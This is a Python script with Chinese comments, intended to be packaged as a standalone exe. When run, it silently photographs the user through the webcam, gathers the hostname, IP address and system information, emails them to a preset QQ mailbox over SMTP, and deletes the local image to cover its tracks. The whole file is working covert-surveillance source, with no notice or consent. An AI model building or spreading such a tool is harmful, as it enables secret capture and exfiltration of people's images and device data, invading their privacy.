# 打包exe  使用摄像头拍摄照片发送到指定邮箱
# 打包命令 pyinstaller,py2app,py2exe
# pyinstaller --console --onefile getCapImg.py
# pip install opencv-python
import cv2
import os
import json
import socket
import platform
from smtplib import SMTP_SSL
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
from email.utils import parseaddr, formataddr


# 获取电脑系统信息
def get_system():
    # platform.platform()  # 获取操作系统名称及版本号，'Linux-3.13.0-46-generic-i686-with-Deepin-2014.2-trusty'
    # platform.version()  # 获取操作系统版本号，'#76-Ubuntu SMP Thu Feb 26 18:52:49 UTC 2015'
    # platform.architecture()  # 获取操作系统的位数，('32bit', 'ELF')
    # platform.machine()  # 计算机类型，'i686'
    # platform.node()  # 计算机的网络名称，'XF654'
    # platform.processor()  # 计算机处理器信息，''i686'
    # 包含上面所有的信息汇总，('Linux', 'XF654', '3.13.0-46-generic', '#76-Ubuntu SMP Thu Feb 26 18:52:49 UTC 2015', 'i686', 'i686')
    return platform.uname()


# 获取用户主机名和ip
def get_hostname():
    # 主机名
    hostname = socket.gethostname()
    # ip
    ipaddr = socket.gethostbyname(hostname)

    return hostname, ipaddr


# 通过摄像头获取照片
# 调用摄像头拍摄照片
def get_photo():
    cap = cv2.VideoCapture(0)
    f, frame = cap.read()
    cv2.imwrite('image.jpg', frame)
    cap.release()


def _format_addr(s):
    name, addr = parseaddr(s)
    return formataddr((Header(name, 'utf-8').encode(), addr))


# 把图片发送到邮箱
def send_message():
    # 获取用户IP和主机名
    hostname, ipaddr = get_hostname()
    # 系统信息
    sys_info = json.dumps(get_system())

    # 选择QQ邮箱发送照片
    host_server = 'smtp.qq.com'         # QQ邮箱smtp服务器
    pwd = '授权码'            # 授权码
    from_qq_mail = '***@qq.com'          # 发件人
    to_qq_mail = '***@qq.com'            # 收件人
    msg = MIMEMultipart()               # 创建一封带附件的邮件

    msg['Subject'] = Header(hostname, 'UTF-8')    # 消息主题
    msg['From'] = _format_addr('发件人<%s>' % from_qq_mail)  # 发件人
    msg['To'] = _format_addr('管理员<%s>' % to_qq_mail)  # 收件人

    content = ipaddr+''+sys_info

    msg.attach(MIMEText(content, 'html', 'UTF-8'))    # 添加邮件文本信息

    # 加载附件到邮箱中  SSL 方式   加密
    image = MIMEText(open('image.jpg', 'rb').read(), 'base64', 'utf-8')
    image["Content-Type"] = 'image/jpeg'   # 附件格式为图片的加密数据
    msg.attach(image)                      # 附件添加

    # 开始发送邮件
    smtp = SMTP_SSL(host_server)           # 链接服务器
    smtp .login(from_qq_mail, pwd)         # 登录邮箱
    smtp.sendmail(from_qq_mail, to_qq_mail, msg.as_string())  # 发送邮箱
    print("邮件发送成功")
    smtp.quit()     # 退出

if __name__ == '__main__':
    # 开启摄像头获取照片
    get_photo()
    # 发送照片
    send_message()
    # 删除本地照片
    os.remove('image.jpg')
